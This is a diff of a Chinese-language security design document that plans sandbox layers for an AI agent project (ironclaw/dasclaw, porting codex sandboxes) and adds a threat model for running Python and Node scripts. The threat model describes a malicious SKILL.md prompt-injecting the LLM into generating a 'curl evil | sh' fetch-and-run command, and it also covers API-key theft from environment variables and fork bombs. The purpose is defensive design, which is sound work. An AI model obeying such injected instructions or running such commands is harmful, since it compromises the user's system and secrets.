@@ -330,9 +330,12 @@ const SENSITIVE_PARTS: &[&str] = &[
 | crate / 模块 | 行数 | 来源 | 技术 | 路线 B 决策 |
 |---|---|---|---|---|
 | `ironclaw_workspace_cap` | 568 | ironclaw 原生 | cap_std | ✅ **保留**, 不 port codex |
-| `dasclaw_sandbox_linux` | ~4,780 | **codex linux-sandbox port** | bubblewrap + seccomp + landlock + netns | ★ **新增**, 零实现需 port |
-| `dasclaw_sandbox_windows` | ~9,753 | **codex windows-sandbox-rs port** | Restricted Token + Cap SID + ACL + Firewall | ★ **新增**, 零实现需 port |
-| `ironclaw sandbox/` + `sandbox/proxy/` | 3,611 | ironclaw 原生 | Docker + proxy + allowlist | ✅ **保留**, 用于容器级兔底 |
+| `dasclaw_sandbox` (统一管理器) | ~1000 | **codex sandboxing/ port** | 跨平台 policy 分发 | ★ **新增** |
+| `dasclaw_sandbox_linux` | ~4,780 | **codex linux-sandbox port** | bubblewrap + seccomp + landlock + netns | ★ **新增** |
+| `dasclaw_sandbox_windows` | ~9,753 | **codex windows-sandbox-rs port** | Restricted Token + Cap SID + ACL + Firewall | ★ **新增** |
+| `dasclaw_sandbox_macos` | ~721 + .sbpl | **codex sandboxing/src/seatbelt.rs port** | Seatbelt / sandbox-exec + TrustedBSD MAC 策略 | ★ **新增** |
+| `ironclaw sandbox/` + `sandbox/proxy/` | 3,611 | ironclaw 原生 | Docker host 侧 + 出口代理 + allowlist | ✅ **保留** |
+| `ironclaw worker/` | 5,343 | ironclaw 独有 | 容器内 guest runtime + ProxyLlmProvider | ✅ **保留** |
 
 **该 port 的**: codex 的 linux-sandbox / windows-sandbox-rs (ironclaw 无子进程级沙箱实现)
 **该保留的**: ironclaw 的 workspace_cap (应用层) + sandbox (容器层)
@@ -352,9 +355,12 @@ const SENSITIVE_PARTS: &[&str] = &[
 | 层级 | 能力 | 实现来源 | 路线 B 决策 |
 |---|---|---|---|
 | **L1 主进程 FS 防护 (应用层)** | cap_std TOCTOU-safe | `ironclaw_workspace_cap` (568) | ✅ 保留 |
+| **L2 子进程沙箱 (统一管理)** | 跨平台 policy 分发 | `dasclaw_sandbox` ← port codex sandboxing/ | ★ 新增 |
 | **L2 子进程沙箱 (内核层, Linux)** | bubblewrap + seccomp + landlock + netns | `dasclaw_sandbox_linux` ← port codex linux-sandbox (4780) | ★ 新增 |
 | **L2 子进程沙箱 (内核层, Windows)** | Restricted Token + Cap SID + ACL + Firewall | `dasclaw_sandbox_windows` ← port codex windows-sandbox-rs (9753) | ★ 新增 |
-| **L3 容器沙箱 (OS 虚拟化)** | Docker + proxy + allowlist | `ironclaw sandbox/` + `sandbox/proxy/` (3611) | ✅ 保留 |
+| **L2 子进程沙箱 (内核层, macOS)** | Seatbelt / sandbox-exec + .sbpl 策略 | `dasclaw_sandbox_macos` ← port codex sandboxing/src/seatbelt.rs (721) | ★ 新增 |
+| **L3 容器沙箱 host 侧** | Docker + proxy + allowlist | `ironclaw sandbox/` + `sandbox/proxy/` (3611) | ✅ 保留 |
+| **L3 容器沙箱 guest 侧** | 容器内 runtime + ProxyLlmProvider 反向调用 | `ironclaw worker/` (5343) | ✅ 保留 |
 | **L4 工具沙箱 (WASM)** | wasmtime + capability opt-in | `ironclaw tools/wasm/` (15 文件) | ✅ 保留 |
 | **L5 凭证边界** | credential_injector + SecretsStore | `ironclaw secrets/` + `tools/wasm/credential_injector.rs` | ✅ 保留 |
 | **L6 内容安全 (DLP)** | Prompt sanitize + credential/leak detect + policy | `ironclaw_safety` (4849 + fuzz) | ✅ 保留 |
@@ -362,7 +368,62 @@ const SENSITIVE_PARTS: &[&str] = &[
 | **L8 网络审计** | 4 边界 + 5 端口 + 威胁模型 | `NETWORK_SECURITY.md` | ✅ 维护 |
 | **L9 Extension 治理** | 插件元数据校验 + 沙箱 | `extensions/` | ✅ 保留 |
 
-**9 层纵深防御栈**。L1+L3+L4+L5+L6+L7+L8+L9 保留 ironclaw, L2 新增 (port codex)。
+**9 层纵深防御栈**。L1+L3+L4+L5+L6+L7+L8+L9 保留 ironclaw, L2 新增 (port codex 三平台 + 统一管理器)。
+
+---
+
+## 5.5 py / node 脚本在 L2 子进程沙箱的执行模型与风险
+
+### 现状澄清
+
+ironclaw 当前 `skills/` (3,665 行) 是 **SKILL.md 规范**, 按 `skills/mod.rs` 头注释:
+
+> Skills are SKILL.md files (YAML frontmatter + markdown prompt) that extend the agent's behavior through **prompt-level instructions**. Unlike code-level tools (WASM/MCP), skills operate in the **LLM context** and are subject to trust-based authority attenuation.
+
+即 **skills 本身不是可执行脚本**, 是 prompt 注入 + 信任衰减算法。真正"跑 py/node 脚本"的路径是 **`tools/builtin/shell` → L2 沙箱 → 解释器子进程**。
+
+### py / node 能跑吗?
+
+**可以**。进程沙箱的本质是"创建子进程时施加内核级限制", 跟子进程运行什么语言解耦:
+- Linux: bubblewrap bind-mount `/usr/bin/python3`, `/usr/bin/node`, 配合 seccomp policy 放行 py/node 所需 syscall
+- Windows: Restricted Token 启动 `python.exe` / `node.exe`
+- macOS: `sandbox-exec -f policy.sbpl /usr/bin/python3 script.py`
+
+### 5 类攻击面 + mitigation
+
+| # | 攻击面 | 问题描述 | 沙箱侧 mitigation |
+|---|--------|----------|------------------|
+| 1 | **子进程 fork/exec** | py 的 `subprocess.Popen`, node 的 `child_process.spawn` 可能逃到无沙箱孙子进程 | Linux: seccomp deny `execve` (clone 要放给 node 起线程用); macOS: Seatbelt `(deny process-exec)`; Windows: Job Object `LIMIT_BREAKAWAY_OK=0` |
+| 2 | **FS 逃逸写盘** | pip/npm 默认写 `~/.cache`, `~/.npm`, `/tmp` 等非 workspace 位置 | landlock / Seatbelt `(deny file-write*)` / Windows ACL, 仅放行 workspace + tmpfs |
+| 3 | **网络外联** | `pip install` / `npm install` / 被污染依赖的 C2 外联 | **netns + egress proxy allowlist** (codex network-proxy + ironclaw sandbox/proxy/), 禁 DNS 直查 |
+| 4 | **资源耗尽** | `while True: subprocess(...)` / fork bomb / OOM | Linux cgroups v2 (`pids.max` / `memory.max` / `cpu.max`); Windows Job Object 限额; macOS `taskpolicy` + `ulimit` |
+| 5 | **解释器本体 CVE** | Python/Node 自身 RCE CVE (V8, zlib, …) | 版本固定 + 自动更新 + **硬编码绝对路径**(抄 codex seatbelt.rs `MACOS_PATH_TO_SEATBELT_EXECUTABLE = "/usr/bin/sandbox-exec"` 的防 PATH 注入思路) |
+
+### 项目特有的 2 类追加风险
+
+| # | 攻击面 | mitigation 归属层 |
+|---|--------|------------------|
+| 6 | **LLM prompt 间接命令注入** (坏 SKILL.md 诱导 LLM 生成 `os.system("curl evil \| sh")`) | L6 `ironclaw_safety` (prompt sanitize) + claw-code 治理层 `ApprovalPolicy` + shell allowlist |
+| 7 | **环境变量泄密** (py 进程 `os.environ.get("OPENAI_API_KEY")`) | L2 子进程启动必须**清空 env**, 凭证只通过 L5 credential_injector 在边界注入; 与 WASM 层同原则 |
+
+### 结论
+
+> **可以跑, 但必须 "deny-exec seccomp + landlock/seatbelt 写保护 + netns egress proxy + cgroups 限额 + env 清空" 五件套齐上, 少一件就破**。
+> 目前 ironclaw 只有 **L3 Docker** 拥有完整五件套; **L2 子进程沙箱**要等 W7 port 完 codex 三平台 (~15,254 行) 才能达到同等强度。
+> 这是为什么 W7 在 Route B 是独立关键 Wave。
+
+---
+
+## 5.6 ironclaw 外围模块 Route B 归属 (补充)
+
+| 模块 | LOC | 一句话职责 | Route B 决策 |
+|------|----|----------|------------|
+| `skills/` | 3,665 (7 文件) | SKILL.md prompt 层扩展 + trust attenuation (trusted/installed 两态, 最低信任降级) | ✅ **保留 ironclaw** (codex 无对等物; SKILL.md 与 claw-code `agents/` 不冲突) |
+| `evaluation/` | 965 (3 文件) | Job 完成质量评估 (output quality / requirements match / error rate / user feedback) | ✅ **保留 ironclaw** (B 端产品差异) |
+| `observability/` | 835 (6 文件) | Trait-based Observer 插件 (noop/log/multi + prompt_cache), 预留 OTel/Prometheus 扩展位 | ✅ **保留 ironclaw** |
+| `worker/` ⚠️ | 5,343 (7 文件) | **L3 Docker 容器内 guest runtime**: `ironclaw worker` 子命令, 内置 `ProxyLlmProvider` 把 LLM 调用反向代理回 orchestrator → **容器内不持有 API key**, 与 L5 credential_injector 同一"边界注入"思路 | ✅ **保留 ironclaw** (L3 的不可分割组件) |
+
+**`worker/` 是之前 §2.4 遗漏的关键发现**: L3 Docker 沙箱实际是 **host (`sandbox/` 3,611 行) + guest (`worker/` 5,343 行) 双侧协同**, 合计 8,954 行, 不是之前文档说的 3,611 行单侧。
 
 ---
 
